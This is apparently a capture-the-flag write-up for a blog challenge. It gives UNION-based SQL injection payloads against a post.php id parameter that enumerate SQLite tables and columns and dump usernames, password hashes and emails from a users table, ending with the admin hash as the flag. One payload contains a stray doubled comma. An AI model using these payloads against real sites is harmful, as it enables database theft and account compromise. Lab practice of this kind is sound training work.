Challenge Description:
<br>This Junior developper decided to code his own blog.
Prove him that he still has a lot to learn and that security is a big priority when you deal with a website that has a database !

The flag follows this format:
FSIIECTF{administrator's hash}
Example: if the administrator's hash is `721a9b52bfceacc503c056e3b9b93cfa`, then the flag will be `FSIIECTF{721a9b52bfceacc503c056e3b9b93cfa}`.
No external tool other than your browser is needed for this challenge.
The use of automated tools such as sqlmap is STRICTLY PROHIBITED.

## Exploration
```http://192.168.59.128/post.php?id=1```
<br> This type of webpages handling can lead to blind sql injection

## Solution
Finding the tables in the database
Payload: ```2 UNION SELECT null,,null,null,GROUP_CONCAT(name) from sqlite_master```

![image](https://github.com/user-attachments/assets/e72d4afa-e9fd-4e29-8cba-0b9a5727be2f)

List all columns in ```users``` table.
Payload: ```2 UNION SELECT null,null,null,GROUP_CONCAT(name) from pragma_table_info('users')```

![image](https://github.com/user-attachments/assets/0400ece3-7dfc-403c-a796-b8d8667882a4)

List all data row from ```users``` table.
Payload: ```2 UNION SELECT null, null, null, GROUP_CONCAT(id || ':' || username || ':' || password || ':' || email || ':' || role) FROM users```

![image](https://github.com/user-attachments/assets/fb197c36-2d98-4f60-8854-00ea424ba181)

Admin hash: bf4776ba55b41ae54b00fc2fee111562
<br>Flag : FSIIECTF{bf4776ba55b41ae54b00fc2fee111562}
